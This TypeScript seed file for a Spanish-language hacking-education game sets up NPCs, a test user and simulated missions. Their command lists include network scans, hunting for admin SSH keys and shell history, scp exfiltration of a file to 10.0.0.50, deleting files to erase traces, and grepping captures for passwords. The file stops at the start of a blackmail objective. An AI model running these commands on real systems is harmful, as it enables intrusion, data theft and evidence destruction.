// prisma/seed.ts - VERSIÓN BETA (4 MISIONES EXCEPCIONALES)

import { PrismaClient, Rank, Difficulty } from '@prisma/client';
import * as bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

async function main() {
  console.log('🔥 SirTech Creator - Inicializando RED BETA...\n');

  // ═════════════════════════════════════════════════════════
  // 1. LIMPIEZA TOTAL
  // ═════════════════════════════════════════════════════════
  console.log('🧹 Limpiando base de datos...');
  await prisma.activityLog.deleteMany();
  await prisma.missionAttempt.deleteMany();
  await prisma.missionProgress.deleteMany();
  await prisma.variableDefinition.deleteMany();
  await prisma.mission.deleteMany();
  await prisma.npc.deleteMany();
  await prisma.user.deleteMany();
  console.log('✅ Base de datos limpia.\n');

  // ═════════════════════════════════════════════════════════
  // 2. CREAR NPCs (FOCALIZADOS PARA BETA)
  // ═════════════════════════════════════════════════════════
  console.log('🤖 Creando NPCs para Beta...');
  
  const npcBoss = await prisma.npc.create({
    data: {
      name: 'The Boss',
      codename: 'BOSS',
      role: 'Commander',
      description: 'Líder frío y calculador. Exige excelencia.',
      personality: 'cold, demanding, strategic',
      colorTheme: '#FF0055'
    },
  });

  const npcZero = await prisma.npc.create({
    data: {
      name: 'Zero',
      codename: 'ZERO',
      role: 'Technical Instructor',
      description: 'Mentor paciente pero riguroso. Valora el método sobre la velocidad.',
      personality: 'patient, methodical, wise',
      colorTheme: '#00F0FF'
    },
  });

  const npcSally = await prisma.npc.create({
    data: {
      name: 'Sally',
      codename: 'SALLY',
      role: 'Intelligence Analyst',
      description: 'Estratega táctica. Detecta patrones y valora el trabajo limpio.',
      personality: 'analytical, precise, urgent',
      colorTheme: '#00FF88'
    },
  });

  const npcViper = await prisma.npc.create({
    data: {
      name: 'Viper',
      codename: 'VIPER',
      role: 'Rival Operative',
      description: 'Competitivo y despiadado. Siempre un paso adelante.',
      personality: 'aggressive, competitive, mocking',
      colorTheme: '#FFD700'
    },
  });

  console.log('✅ NPCs creados: BOSS, ZERO, SALLY, VIPER\n');

  // ═════════════════════════════════════════════════════════
  // 3. USUARIO DE PRUEBA BETA
  // ═════════════════════════════════════════════════════════
  console.log('👤 Creando Shadow Hunter (Beta Tester)...');
  const testUser = await prisma.user.create({
    data: {
      email: 'beta@sirtech.io',
      passwordHash: await bcrypt.hash('shadow2025', 10),
      nickname: 'ShadowHunter',
      totalXp: 0,
      currentLevel: 1,
      reputation: Rank.SCRIPT_KIDDIE,
      sirCredits: 0,
      globalTrace: 0,
      ganchoStatus: 'SAFE',
      isPremium: false,
      playStyle: 'balanced', // ghost, tank, social
      learningSpeed: 'medium',
    },
  });
  console.log(`✅ Usuario Beta: ${testUser.email} | ${testUser.nickname}\n`);

  // ═════════════════════════════════════════════════════════
  // 4. MISIÓN 0: PROTOCOLO GÉNESIS (TUTORIAL EXTENDIDO)
  // ═════════════════════════════════════════════════════════
  console.log('🛡️  Desplegando ARCO BETA: EL DESPERTAR\n');
  console.log('🎯 MISIÓN 0: PROTOCOLO GÉNESIS (7 objetivos)');

  const mission0 = await prisma.mission.create({
    data: {
      nodeNumber: 0,
      sequenceOrder: 0,
      title: 'Protocolo Génesis',
      description: 'Infiltración inicial en servidor de BlackSphere. 8 minutos antes de que el guardia revise las cámaras.',
      difficulty: Difficulty.TUTORIAL,
      arc: 1,
      npcId: npcZero.id,
      briefing: 'Te infiltré en BlackSphere. Tienes 8 minutos antes del cambio de guardia. Sigue mis instrucciones al pie de la letra.',
      xpReward: 200, // Incrementado por más objetivos
      creditsReward: 25,
      isPremium: false,
      estimatedTime: 12,
      tags: ['tutorial', 'basics', 'stealth', 'timed'],
      isReplayable: true,
      minObjectives: 7, // Todos los objetivos son obligatorios en tutorial
      maxObjectives: 7,
      
      objectivesPool: [
        // OBJETIVO 1: Verificar identidad (whoami)
        {
          code: 'VERIFY_IDENTITY',
          description: 'Confirma tu identidad camuflada',
          hint: 'Comando: whoami',
          commands: ['whoami'],
          traceImpact: 2,
          category: 'identity',
          tutorialDialogue: {
            intro: [
              {
                character: 'ZERO',
                text: 'Primera regla: siempre verifica tu identidad.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'Estás camuflado como usuario "guest". Usa whoami para confirmar.',
                mood: 'neutral'
              },
              {
                character: 'ZERO',
                text: 'Escribe: whoami (sin comillas) y presiona Enter.',
                mood: 'neutral'
              }
            ],
            onSuccess: [
              {
                character: 'ZERO',
                text: 'Bien. Eres "guest". Perfecto para pasar desapercibido.',
                mood: 'success'
              }
            ],
            onError: [
              {
                character: 'ZERO',
                text: 'Error. Escribe exactamente: whoami',
                mood: 'alert'
              }
            ]
          }
        },
        // OBJETIVO 2: Verificar permisos (id)
        {
          code: 'CHECK_PERMISSIONS',
          description: 'Verifica los grupos a los que perteneces',
          hint: 'Comando: id',
          commands: ['id'],
          traceImpact: 3,
          category: 'identity',
          tutorialDialogue: {
            intro: [
              {
                character: 'ZERO',
                text: 'Segunda regla: conoce tus límites.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'Cada usuario tiene permisos. El comando "id" muestra tu UID y grupos.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'UID=0 eres root (admin). Si no, estás limitado.',
                mood: 'neutral'
              }
            ],
            onSuccess: [
              {
                character: 'ZERO',
                text: 'Ves tu UID y grupos. No eres root, pero tienes acceso básico.',
                mood: 'success'
              }
            ],
            onError: [
              {
                character: 'ZERO',
                text: 'Comando incorrecto. Solo: id',
                mood: 'alert'
              }
            ]
          }
        },
        // OBJETIVO 3: Explorar sistema (ls)
        {
          code: 'EXPLORE_SYSTEM',
          description: 'Lista los archivos en el directorio actual',
          hint: 'Comando: ls',
          commands: ['ls'],
          traceImpact: 4,
          category: 'exploration',
          tutorialDialogue: {
            intro: [
              {
                character: 'ZERO',
                text: 'Tercera regla: explora tu entorno.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: '"ls" lista archivos. Esencial para entender dónde estás.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'Escribe: ls',
                mood: 'neutral'
              }
            ],
            onSuccess: [
              {
                character: 'ZERO',
                text: 'Buen ojo. Ves archivos del sistema. Nota "backup.zip" - podría ser útil.',
                mood: 'success'
              }
            ],
            onError: [
              {
                character: 'ZERO',
                text: 'Error. Solo las letras "l" y "s" (ls).',
                mood: 'alert'
              }
            ]
          }
        },
        // OBJETIVO 4: Ver directorio actual (pwd)
        {
          code: 'CHECK_LOCATION',
          description: 'Identifica tu ubicación en el sistema',
          hint: 'Comando: pwd',
          commands: ['pwd'],
          traceImpact: 2,
          category: 'navigation',
          tutorialDialogue: {
            intro: [
              {
                character: 'ZERO',
                text: 'Cuarta regla: nunca te pierdas.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: '"pwd" (Print Working Directory) te dice exactamente dónde estás.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'Útil para navegar y luego retornar.',
                mood: 'neutral'
              }
            ],
            onSuccess: [
              {
                character: 'ZERO',
                text: 'Estás en /home/guest. Directorio seguro para operar.',
                mood: 'success'
              }
            ],
            onError: [
              {
                character: 'ZERO',
                text: 'No. Escribe: pwd',
                mood: 'alert'
              }
            ]
          }
        },
        // OBJETIVO 5: Ver info del sistema (uname -a)
        {
          code: 'CHECK_SYSTEM_INFO',
          description: 'Identifica el sistema operativo y kernel',
          hint: 'Comando: uname -a',
          commands: ['uname -a'],
          traceImpact: 5,
          category: 'system_info',
          tutorialDialogue: {
            intro: [
              {
                character: 'ZERO',
                text: 'Quinta regla: conoce a tu enemigo.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'uname -a muestra detalles del sistema: kernel, arquitectura, versión.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'Crítico para saber qué exploits funcionarán.',
                mood: 'serious'
              }
            ],
            onSuccess: [
              {
                character: 'ZERO',
                text: 'Linux 5.x. Sistema moderno pero vulnerable si sabemos cómo.',
                mood: 'success'
              }
            ],
            onError: [
              {
                character: 'ZERO',
                text: 'Error. Escribe: uname -a (con espacio).',
                mood: 'alert'
              }
            ]
          }
        },
        // OBJETIVO 6: Ver procesos (ps aux)
        {
          code: 'CHECK_PROCESSES',
          description: 'Verifica qué procesos están corriendo',
          hint: 'Comando: ps aux',
          commands: ['ps aux'],
          traceImpact: 6,
          category: 'system_info',
          tutorialDialogue: {
            intro: [
              {
                character: 'ZERO',
                text: 'Sexta regla: vigila la actividad.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: '"ps aux" lista todos los procesos. ¿Hay administradores conectados?',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'Si ves "root" activo, ten cuidado.',
                mood: 'warning'
              }
            ],
            onSuccess: [
              {
                character: 'ZERO',
                text: 'Sistema tranquilo. Solo procesos básicos. Podemos proceder.',
                mood: 'success'
              }
            ],
            onError: [
              {
                character: 'ZERO',
                text: 'Incorrecto. Escribe: ps aux',
                mood: 'alert'
              }
            ]
          }
        },
        // OBJETIVO 7: Verificar conectividad (ping localhost)
        {
          code: 'CHECK_CONNECTIVITY',
          description: 'Verifica que la red local funciona',
          hint: 'Comando: ping -c 3 localhost',
          commands: ['ping -c 3 localhost'],
          traceImpact: 4,
          category: 'network',
          tutorialDialogue: {
            intro: [
              {
                character: 'ZERO',
                text: 'Última regla: prueba la conectividad.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: '"ping" verifica conexión de red. Usamos -c 3 para solo 3 paquetes.',
                mood: 'teaching'
              },
              {
                character: 'ZERO',
                text: 'Localhost es tu propia máquina. Buena práctica antes de escanear.',
                mood: 'neutral'
              }
            ],
            onSuccess: [
              {
                character: 'ZERO',
                text: 'Red operativa. Has completado el protocolo básico.',
                mood: 'success'
              },
              {
                character: 'BOSS',
                text: 'Aceptable. Procede a misiones reales.',
                mood: 'cold'
              }
            ],
            onError: [
              {
                character: 'ZERO',
                text: 'No. Escribe: ping -c 3 localhost',
                mood: 'alert'
              }
            ]
          }
        }
      ],
      
      objectives: [],
      tracebackConfig: { 
        maxTrace: 100, 
        warningThreshold: 60,
        errorPenalty: 10,
        timePenalty: true // Penaliza por tardar mucho
      },
      allowedCommands: ['whoami', 'id', 'ls', 'pwd', 'uname', 'ps', 'ping', 'clear', 'help'],
      requiredNodeNumber: null,
      
      introDialog: [
        { 
          character: 'BOSS', 
          text: 'Shadow Hunter. Este es tu examen de iniciación.', 
          mood: 'cold' 
        },
        { 
          character: 'ZERO', 
          text: 'Operativo, te infiltré en BlackSphere. Tienes 8 minutos antes del cambio de guardia.', 
          mood: 'urgent' 
        },
        { 
          character: 'ZERO', 
          text: 'Sigue mis instrucciones exactamente. Cada segundo cuenta.', 
          mood: 'serious' 
        }
      ],
      
      outroDialogSuccess: [
        {
          character: 'ZERO',
          text: 'Protocolo completado. Has demostado comprensión básica.',
          mood: 'satisfied'
        },
        {
          character: 'BOSS',
          text: 'Aceptable. Proceed to real operations.',
          mood: 'neutral'
        }
      ],
      
      outroDialogFailure: [
        {
          character: 'ZERO',
          text: 'Te detectaron. Afortunadamente, fue solo un simulacro.',
          mood: 'disappointed'
        },
        {
          character: 'BOSS',
          text: 'Inaceptable. Inténtalo de nuevo.',
          mood: 'angry'
        }
      ]
    },
  });

  // ═════════════════════════════════════════════════════════
  // 5. MISIÓN 1: SOMBRA DIGITAL (Reconocimiento + Dilema Ético)
  // ═════════════════════════════════════════════════════════
  console.log('🎯 MISIÓN 1: SOMBRA DIGITAL (Dilema Ético)');

  const mission1 = await prisma.mission.create({
    data: {
      nodeNumber: 1,
      sequenceOrder: 1,
      title: 'Sombra Digital',
      description: 'Escaneo de red corporativa. Descubres servidores personales junto al objetivo.',
      difficulty: Difficulty.EASY,
      arc: 1,
      npcId: npcZero.id,
      briefing: 'Necesitamos mapear la red de TechCorp. Pero cuidado: hay servidores personales de empleados. Decide éticamente.',
      xpReward: 350,
      creditsReward: 75,
      isPremium: false,
      estimatedTime: 15,
      tags: ['network', 'recon', 'ethical-dilemma', 'stealth'],
      isReplayable: true,
      minObjectives: 4,
      maxObjectives: 5,
      
      objectivesPool: [
        {
          code: 'CHECK_LOCAL_IP',
          description: 'Identifica tu dirección IP local',
          hint: 'ifconfig o ip addr',
          commands: ['ifconfig', 'ip addr', 'hostname -I'],
          traceImpact: 5,
          category: 'recon',
        },
        {
          code: 'DISCOVER_NETWORK',
          description: 'Descubre hosts en la red local',
          hint: 'nmap -sn para discovery',
          commands: ['nmap -sn 192.168.1.0/24'],
          traceImpact: 15,
          category: 'scanning',
          specialTrigger: 'ETHICAL_DILEMMA' // Dispara el dilema
        },
        {
          code: 'SCAN_TARGET',
          description: 'Escanea puertos del objetivo principal',
          hint: 'nmap sin flags para puertos comunes',
          commands: ['nmap 192.168.1.100'],
          traceImpact: 20,
          category: 'scanning',
        },
        {
          code: 'CHECK_CONNECTIVITY',
          description: 'Verifica conectividad con el objetivo',
          hint: 'ping con 3 paquetes',
          commands: ['ping -c 3 192.168.1.100'],
          traceImpact: 8,
          category: 'network',
        },
        {
          code: 'VERIFY_SERVICES',
          description: 'Identifica servicios en puertos abiertos',
          hint: 'nmap -sV para versiones de servicio',
          commands: ['nmap -sV 192.168.1.100'],
          traceImpact: 25,
          category: 'analysis',
        },
        // OBJETIVO SECRETO (si explora servidor personal)
        {
          code: 'EXPLORE_PERSONAL',
          description: '[OPCIONAL] Explora el servidor personal',
          hint: 'nmap 192.168.1.150',
          commands: ['nmap 192.168.1.150', 'nmap -p 80,443 192.168.1.150'],
          traceImpact: 30,
          category: 'ethical-test',
          isHidden: true,
          unlocksOn: 'DISCOVER_NETWORK'
        }
      ],
      
      objectives: [],
      tracebackConfig: { 
        maxTrace: 100, 
        warningThreshold: 65,
        ethicalPenalty: true // Penaliza comportamiento no ético
      },
      allowedCommands: ['ifconfig', 'ip', 'nmap', 'ping', 'netstat', 'route', 'clear'],
      requiredNodeNumber: 0,
      
      introDialog: [
        { 
          character: 'ZERO', 
          text: 'TechCorp tiene un servidor expuesto. Tu objetivo es 192.168.1.100.', 
          mood: 'focused' 
        },
        { 
          character: 'ZERO', 
          text: 'Pero ten cuidado: la red tiene servidores personales de empleados.', 
          mood: 'warning' 
        },
        { 
          character: 'ZERO', 
          text: 'Un hacker ético solo ataca el objetivo asignado. Recuerda eso.', 
          mood: 'serious' 
        }
      ],
      
      // Dialogo especial cuando descubre servidor personal
      specialDialogue: {
        ETHICAL_DILEMMA: [
          {
            character: 'SALLY',
            text: '¡Detente! Acabas de descubrir 192.168.1.150 - parece ser personal.',
            mood: 'urgent'
          },
          {
            character: 'SALLY',
            text: 'Tienes opciones:',
            mood: 'analytical'
          },
          {
            character: 'SALLY',
            text: 'A) Ignorarlo (ético) - Continúa con el objetivo',
            mood: 'neutral'
          },
          {
            character: 'SALLY',
            text: 'B) Explorarlo (curioso) - Riesgo ético, pero +info',
            mood: 'neutral'
          },
          {
            character: 'SALLY',
            text: 'Tu reputación en SirTech depende de esto.',
            mood: 'serious'
          }
        ]
      }
    },
  });
  // ═════════════════════════════════════════════════════════
// MISIÓN 2: INFILTRACIÓN BÁSICA (Comandos de navegación)
// ═════════════════════════════════════════════════════════
console.log('🎯 MISIÓN 2: INFILTRACIÓN BÁSICA');

const mission2 = await prisma.mission.create({
  data: {
    nodeNumber: 2,
    sequenceOrder: 2,
    title: 'Infiltración Básica',
    description: 'Navega por el sistema de archivos y encuentra información clave.',
    difficulty: Difficulty.EASY,
    arc: 1,
    npcId: npcZero.id,
    briefing: 'Necesitamos que explores el servidor objetivo. Encuentra los archivos de configuración y reporta.',
    xpReward: 400,
    creditsReward: 100,
    isPremium: false,
    estimatedTime: 15,
    tags: ['navigation', 'recon', 'basics'],
    isReplayable: true,
    minObjectives: 4,
    maxObjectives: 5,
    
    objectivesPool: [
      {
        code: 'CHECK_DIRECTORY',
        description: 'Verifica tu directorio actual',
        hint: 'pwd muestra dónde estás',
        commands: ['pwd'],
        traceImpact: 3,
        category: 'navigation',
      },
      {
        code: 'LIST_FILES',
        description: 'Lista todos los archivos del directorio',
        hint: 'ls muestra archivos',
        commands: ['ls', 'ls -la'],
        traceImpact: 5,
        category: 'exploration',
      },
      {
        code: 'NAVIGATE_HOME',
        description: 'Navega al directorio home',
        hint: 'cd sin argumentos va a home',
        commands: ['cd ~', 'cd /home'],
        traceImpact: 4,
        category: 'navigation',
      },
      {
        code: 'FIND_CONFIG',
        description: 'Encuentra archivos de configuración',
        hint: 'find busca archivos por nombre',
        commands: ['find /etc -name "*.conf"', 'find ~ -name "config*"'],
        traceImpact: 12,
        category: 'search',
      },
      {
        code: 'READ_CONFIG',
        description: 'Lee el contenido de un archivo de configuración',
        hint: 'cat muestra contenido de archivos',
        commands: ['cat /etc/hosts', 'cat ~/.bashrc'],
        traceImpact: 8,
        category: 'analysis',
      },
    ],
    
    objectives: [],
    tracebackConfig: { 
      maxTrace: 100, 
      warningThreshold: 65,
    },
    allowedCommands: ['pwd', 'ls', 'cd', 'find', 'cat', 'less', 'grep', 'clear'],
    requiredNodeNumber: 1,
    
    introDialog: [
      { 
        character: 'ZERO', 
        text: 'Esta vez trabajas solo. Navega el sistema y encuentra lo que necesitamos.', 
        mood: 'focused' 
      },
      { 
        character: 'ZERO', 
        text: 'Recuerda: pwd, ls, cd, find. Esas son tus herramientas básicas.', 
        mood: 'teaching' 
      },
    ],
  },
});

  // ═════════════════════════════════════════════════════════
  // 6. MISIÓN 3: FUGA DE DATOS - SECTOR 7 (Timer + Múltiples Finales)
  // ═════════════════════════════════════════════════════════
  console.log('🎯 MISIÓN 3: FUGA DE DATOS - SECTOR 7 (Timer Visible)');

  const mission3 = await prisma.mission.create({
    data: {
      nodeNumber: 3,
      sequenceOrder: 3,
      title: 'Fuga de Datos: Sector 7',
      description: 'El sysadmin salió por 15 minutos. Encuentra y exfiltra el archivo antes de que regrese.',
      difficulty: Difficulty.MEDIUM,
      arc: 1,
      npcId: npcSally.id,
      briefing: 'Proyecto Fénix está en este servidor. El sysadmin regresa en 15 minutos. Encuentra el archivo y sácalo.',
      xpReward: 600,
      creditsReward: 150,
      isPremium: false,
      estimatedTime: 20,
      tags: ['timer', 'stealth', 'exfiltration', 'multiple-endings'],
      isReplayable: true,
      minObjectives: 4,
      maxObjectives: 6,
      
      objectivesPool: [
        {
          code: 'NAVIGATE_TO_VAR',
          description: 'Navega al directorio /var donde están los proyectos',
          hint: 'cd /var',
          commands: ['cd /var', 'cd /var && ls'],
          traceImpact: 5,
          category: 'navigation',
        },
        {
          code: 'SEARCH_PROJECT',
          description: 'Busca archivos relacionados con "fénix"',
          hint: 'find con nombre',
          commands: ['find /var -name "*fenix*"', 'find /var -name "*.zip"'],
          traceImpact: 15,
          category: 'search',
        },
        {
          code: 'VERIFY_FILE',
          description: 'Verifica el contenido del archivo encontrado',
          hint: 'cat o less para leer',
          commands: ['cat /var/secure/proyecto_fenix.zip.md5', 'less /var/secure/README.txt'],
          traceImpact: 10,
          category: 'analysis',
        },
        {
          code: 'COPY_FILE',
          description: 'Copia el archivo a tu directorio temporal',
          hint: 'cp para copiar',
          commands: ['cp /var/secure/proyecto_fenix.zip /tmp/'],
          traceImpact: 20,
          category: 'exfiltration',
        },
        {
          code: 'EXFILTRATE',
          description: 'Envía el archivo a nuestro servidor seguro',
          hint: 'scp para transferencia segura',
          commands: ['scp /tmp/proyecto_fenix.zip shadow@10.0.0.50:/incoming/'],
          traceImpact: 25,
          category: 'exfiltration',
        },
        {
          code: 'CLEAN_TRACES',
          description: '[OPCIONAL] Limpia tus huellas',
          hint: 'rm para eliminar copias temporales',
          commands: ['rm /tmp/proyecto_fenix.zip', 'rm -f /tmp/*'],
          traceImpact: -15, // Reduce trace
          category: 'stealth',
          isOptional: true
        },
        {
          code: 'FIND_CREDENTIALS',
          description: '[SECRETO] Encuentra credenciales del admin',
          hint: 'Busca en /home del sysadmin',
          commands: ['find /home -name ".ssh"', 'cat /home/admin/.bash_history'],
          traceImpact: 30,
          category: 'bonus',
          isHidden: true,
          bonusXp: 100
        }
      ],
      
      objectives: [],
      tracebackConfig: { 
        maxTrace: 100, 
        warningThreshold: 70,
        timeLimit: 900, // 15 minutos en segundos
        timeBonus: true // Bonus por terminar rápido
      },
      allowedCommands: ['cd', 'ls', 'find', 'cat', 'less', 'cp', 'scp', 'rm', 'pwd', 'clear'],
      requiredNodeNumber: 1,
      
      introDialog: [
        { 
          character: 'SALLY', 
          text: 'Shadow Hunter, el sysadmin acaba de salir. Tienes 15 minutos exactos.', 
          mood: 'urgent' 
        },
        { 
          character: 'SALLY', 
          text: 'Busca "proyecto_fenix.zip" en /var/secure/. Es crítico para nuestra operación.', 
          mood: 'focused' 
        },
        { 
          character: 'SALLY', 
          text: '¡CUIDADO! Si no limpias tus huellas, nos descubrirán.', 
          mood: 'warning' 
        }
      ],
      
      // Eventos temporales (cada 5 minutos)
      timedEvents: [
        {
          time: 300, // 5 minutos
          message: "SALLY: 10 minutos restantes. El sysadmin está en la cafetería.",
          mood: "update"
        },
        {
          time: 600, // 10 minutos  
          message: "SALLY: 5 minutos. Se está levantando de la mesa.",
          mood: "urgent"
        },
        {
          time: 780, // 13 minutos
          message: "SALLY: ¡2 MINUTOS! Termina o aborta.",
          mood: "panicked"
        }
      ]
    },
  });

// ═════════════════════════════════════════════════════════
// NUEVA MISIÓN 4: INTERCEPTACIÓN DE SEÑALES (PUENTE)
// ═════════════════════════════════════════════════════════
console.log('🎯 MISIÓN 4: INTERCEPTACIÓN DE SEÑALES (Transición)');

const mission4 = await prisma.mission.create({
  data: {
    nodeNumber: 4,
    sequenceOrder: 4,
    title: 'Interceptación de Señales',
    description: 'Un empleado descontento filtra información corporativa. Intercepta el tráfico y descubre al traidor antes de que el equipo de seguridad lo haga.',
    difficulty: Difficulty.MEDIUM,
    arc: 1,
    npcId: npcSally.id,
    briefing: 'Detectamos tráfico sospechoso saliendo de la red de TechCorp. Alguien está vendiendo secretos. Encuentra quién es y qué está filtrando. Tienes acceso a un punto de escucha en la red.',
    xpReward: 700,
    creditsReward: 175,
    isPremium: false,
    estimatedTime: 20,
    tags: ['network-analysis', 'traffic-capture', 'investigation', 'stealth', 'preparation-ad'],
    isReplayable: true,
    minObjectives: 5,
    maxObjectives: 7,
    
    objectivesPool: [
      // FASE 1: PREPARACIÓN Y RECONOCIMIENTO
      {
        code: 'READ_BRIEFING',
        description: 'Lee el informe de inteligencia sobre el caso',
        hint: 'cat para leer archivos de texto',
        commands: ['cat /home/shadow/intel/case-report.txt', 'cat ~/intel/case-report.txt'],
        traceImpact: 0,
        category: 'preparation',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Antes de actuar, lee el informe completo.', mood: 'teaching' },
            { character: 'SALLY', text: 'Contiene lo que sabemos del sospechoso y la red.', mood: 'analytical' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Bien. El tráfico sospechoso sale por el puerto 8443. No estándar.', mood: 'satisfied' },
            { character: 'SALLY', text: 'El sospechoso usa la subnet 192.168.50.0/24. Empieza ahí.', mood: 'focused' }
          ]
        }
      },
      {
        code: 'CHECK_INTERFACES',
        description: 'Lista las interfaces de red disponibles',
        hint: 'ip link o ifconfig',
        commands: ['ip link', 'ip link show', 'ifconfig', 'ifconfig -a', 'ip a'],
        traceImpact: 3,
        category: 'recon',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Primero, identifica tus interfaces de red.', mood: 'teaching' },
            { character: 'SALLY', text: 'Necesitas saber por dónde fluye el tráfico.', mood: 'neutral' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'eth0 conectada a la red corporativa. eth1 es tu salida segura.', mood: 'success' }
          ]
        }
      },
      {
        code: 'VERIFY_NETWORK_RANGE',
        description: 'Confirma el rango de red del sospechoso',
        hint: 'nmap -sn para descubrimiento sin ruido',
        commands: ['nmap -sn 192.168.50.0/24', 'nmap -sn 192.168.50.1-254'],
        traceImpact: 10,
        category: 'scanning',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Confirma qué hosts están activos en la subnet sospechosa.', mood: 'focused' },
            { character: 'SALLY', text: 'nmap -sn hace ping sweep. Silencioso pero efectivo.', mood: 'teaching' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '3 hosts activos: .10, .25, .42. El .42 tiene más actividad.', mood: 'analytical' }
          ]
        }
      },
      
      // FASE 2: CAPTURA DE TRÁFICO
      {
        code: 'CAPTURE_TRAFFIC',
        description: 'Captura tráfico de red en el puerto sospechoso',
        hint: 'tcpdump con filtro de puerto',
        commands: [
          'tcpdump -i eth0 port 8443 -c 50',
          'tcpdump -i eth0 port 8443 -c 50 -w capture.pcap',
          'tcpdump -i eth0 -c 100 port 8443'
        ],
        traceImpact: 15,
        category: 'interception',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'tcpdump captura paquetes en tiempo real.', mood: 'teaching' },
            { character: 'SALLY', text: '-i eth0 especifica interfaz, port 8443 filtra el tráfico sospechoso.', mood: 'analytical' },
            { character: 'SALLY', text: '-c 50 limita a 50 paquetes. No queremos llenar el disco.', mood: 'warning' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '¡Tráfico capturado! Veo conexiones salientes cifradas...', mood: 'excited' },
            { character: 'SALLY', text: 'Pero espera... hay metadata en texto plano. Amateur.', mood: 'mocking' }
          ]
        }
      },
      {
        code: 'ANALYZE_CONNECTIONS',
        description: 'Analiza conexiones activas en el sistema',
        hint: 'netstat o ss para ver conexiones',
        commands: ['netstat -tuln', 'netstat -tulnp', 'ss -tuln', 'ss -tulnp'],
        traceImpact: 8,
        category: 'analysis',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'netstat y ss muestran conexiones activas.', mood: 'teaching' },
            { character: 'SALLY', text: '-t TCP, -u UDP, -l listening, -n numérico, -p proceso.', mood: 'analytical' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Puerto 8443 conectado a IP externa: 45.33.32.156', mood: 'alert' },
            { character: 'SALLY', text: 'Esa IP está en una lista negra. Confirmado: exfiltración.', mood: 'serious' }
          ]
        }
      },
      
      // FASE 3: IDENTIFICACIÓN DEL TRAIDOR
      {
        code: 'EXTRACT_STRINGS',
        description: 'Extrae texto legible de la captura',
        hint: 'strings para extraer texto de binarios',
        commands: [
          'strings capture.pcap | grep -i password',
          'strings capture.pcap | grep -i user',
          'strings capture.pcap',
          'tcpdump -r capture.pcap -A | grep -i pass'
        ],
        traceImpact: 5,
        category: 'analysis',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'strings extrae texto legible de cualquier archivo.', mood: 'teaching' },
            { character: 'SALLY', text: 'Combínalo con grep para buscar palabras clave.', mood: 'focused' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '¡BINGO! Usuario: j.martinez@techcorp.local', mood: 'triumphant' },
            { character: 'SALLY', text: 'Juan Martínez, departamento de Finanzas. Tenemos al traidor.', mood: 'satisfied' }
          ]
        }
      },
      {
        code: 'IDENTIFY_PROCESS',
        description: 'Identifica qué proceso genera el tráfico',
        hint: 'lsof para ver qué proceso usa el puerto',
        commands: [
          'lsof -i :8443',
          'lsof -i tcp:8443',
          'fuser 8443/tcp',
          'netstat -tulnp | grep 8443'
        ],
        traceImpact: 10,
        category: 'investigation',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'lsof lista archivos abiertos, incluyendo conexiones de red.', mood: 'teaching' },
            { character: 'SALLY', text: '-i :8443 filtra por puerto. Veremos qué programa lo usa.', mood: 'analytical' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Proceso: "sync-client" PID 4521. Software no autorizado.', mood: 'alert' },
            { character: 'SALLY', text: 'Corre desde /home/jmartinez/.hidden/sync-client', mood: 'serious' }
          ]
        }
      },
      
      // FASE 4: DOCUMENTACIÓN Y DECISIÓN ÉTICA
      {
        code: 'DOCUMENT_EVIDENCE',
        description: 'Guarda la evidencia en un archivo de reporte',
        hint: 'echo y redirección para crear archivos',
        commands: [
          'echo "Sospechoso: j.martinez - Puerto: 8443 - Destino: 45.33.32.156" > /tmp/evidence.txt',
          'echo "EVIDENCIA: jmartinez exfiltrando datos" >> /tmp/report.txt',
          'cat capture.pcap > /tmp/evidence.pcap'
        ],
        traceImpact: 5,
        category: 'documentation',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Documenta todo. La evidencia es crucial.', mood: 'serious' },
            { character: 'SALLY', text: 'echo con > crea archivo, >> añade al final.', mood: 'teaching' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Evidencia documentada. Ahora viene la decisión difícil...', mood: 'thoughtful' }
          ]
        }
      },
      
      // OBJETIVO ESPECIAL: DILEMA ÉTICO
      {
        code: 'REPORT_TO_BOSS',
        description: '[ÉTICO] Reporta al Boss y entrega la evidencia',
        hint: 'scp para transferir el reporte',
        commands: [
          'scp /tmp/evidence.txt shadow@10.0.0.50:/reports/',
          'scp /tmp/report.txt shadow@10.0.0.50:/incoming/'
        ],
        traceImpact: 8,
        category: 'ethical-choice',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Opción A: Reporta al Boss. Es lo correcto.', mood: 'serious' },
            { character: 'SALLY', text: 'Martínez enfrentará consecuencias, pero es un traidor.', mood: 'neutral' }
          ],
          onSuccess: [
            { character: 'BOSS', text: 'Bien hecho. La lealtad se recompensa.', mood: 'satisfied' },
            { character: 'SALLY', text: 'Decisión correcta. Tu reputación aumenta.', mood: 'proud' }
          ]
        }
      },
      {
        code: 'BLACKMAIL_TRAITOR',
        description: '[GRIS] Contacta al traidor para negociar',
        hint: 'Crea un mensaje y déjalo en su directorio',
        commands: [
